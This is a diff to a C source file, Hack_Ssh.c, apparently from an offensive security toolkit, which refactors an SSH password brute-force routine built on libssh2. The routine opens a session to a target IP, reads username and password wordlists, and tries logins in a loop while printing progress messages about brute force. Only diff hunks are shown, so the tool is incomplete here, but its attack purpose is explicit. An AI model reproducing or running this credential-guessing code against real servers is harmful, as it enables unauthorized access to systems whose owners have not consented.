@@ -1,10 +1,10 @@
 /*
  ============================================================================
- Name        : Hack_port_22.c
+ Name        : Hack_Ssh.c
  Author      : L.
  Version     : 1.0.5
  Copyright   : GNU General Public License v3.0
- Description : Hack Port 22
+ Description : Hack SSH
  ============================================================================
  */
 
@@ -12,21 +12,18 @@
 
 #define LIBSSH2_INIT_NO_CRYPTO 0x0001
 
-int hack_port_22(in_addr_t ip, int port, int scanType){
-	// Port banner grabbing
-	printf("%s", WHITE);
-	printf("\nTrying to port grabbing...\n\n");
-	printf("%s",BLUE);
-	port_grabbing(ip, port);
-	if(scanType==FOOTPRINTING_SCAN) return EXIT_SUCCESS;
-	// BFA
-	printf("%s",WHITE);
+int hack_ssh(in_addr_t ip, int port){
+	char c[128]="n";
 	printf("\nTrying to perform connections by using brute force...\n\n");
 	printf("%s",BLUE);
 	char *userauthlist;
 	int auth_pw = 0, timeouts=0;
 	LIBSSH2_SESSION *session=NULL;
 	int sk=create_SSH_handshake_session(&session, ip, port);
+	if(sk<0){
+		printf("create_SSH_handshake_session() error: Error: %d (%s)\n", errno, strerror(errno));
+		goto exit;
+	}
 	const char *fingerprint;
 	fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
 	printf("Fingerprint: ");
@@ -35,8 +32,8 @@ int hack_port_22(in_addr_t ip, int port, int scanType){
 	FILE *f=NULL;
 	int i=0;
 	double totalUsernames=0, totalComb=0, cont=0;
-	if((totalUsernames=open_file("p21_p22_usernames.txt",&f))==-1){
-		printf("fopen(%s) error: Error: %d (%s)\n", "p21_p22_usernames.txt", errno, strerror(errno));
+	if((totalUsernames=open_file("usernames_FTP_SSH.txt",&f))==-1){
+		printf("fopen(%s) error: Error: %d (%s)\n", "usernames_FTP_SSH.txt", errno, strerror(errno));
 		return -1;
 	}
 	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
@@ -44,8 +41,8 @@ int hack_port_22(in_addr_t ip, int port, int scanType){
 	i=0;
 	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
 	int totalPasswords=0;
-	if((totalPasswords=open_file("p22_SSH_passwords.txt",&f))==-1){
-		printf("fopen(%s) error: Error: %d (%s)\n", "p22_SSH_passwords.txt", errno, strerror(errno));
+	if((totalPasswords=open_file("passwords_SSH.txt",&f))==-1){
+		printf("fopen(%s) error: Error: %d (%s)\n", "passwords_SSH.txt", errno, strerror(errno));
 		return -1;
 	}
 	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
@@ -100,13 +97,13 @@ int hack_port_22(in_addr_t ip, int port, int scanType){
 			}
 		}
 	}
+	return 0;
 	exit:
 	libssh2_session_disconnect(session, "");
 	libssh2_session_free(session);
 	printf("%s", DEFAULT);
-	printf("\n");
 	close(sk);
-	return 0;
+	return -1;
 }
 
 int create_SSH_handshake_session(LIBSSH2_SESSION **session, in_addr_t ip, int port){
